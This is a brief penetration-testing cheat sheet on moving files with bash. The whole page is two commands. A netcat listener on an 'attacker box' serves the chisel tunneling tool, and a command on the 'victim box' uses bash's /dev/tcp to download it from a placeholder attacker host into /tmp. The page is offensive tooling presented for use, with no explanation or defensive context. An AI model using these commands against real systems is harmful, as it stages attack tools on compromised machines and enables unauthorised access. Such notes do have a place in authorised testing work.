# Bash File Transfers

## Simple File Transfers

<pre class="language-bash">
<code class="lang-bash"># Attacker Box
nc -lnvp 8000 &#x3C; chisel

# Victim Box
bash -c "cat &#x3C; /dev/tcp/attackerboxip/8000 > /tmp/chisel"
</code></pre>

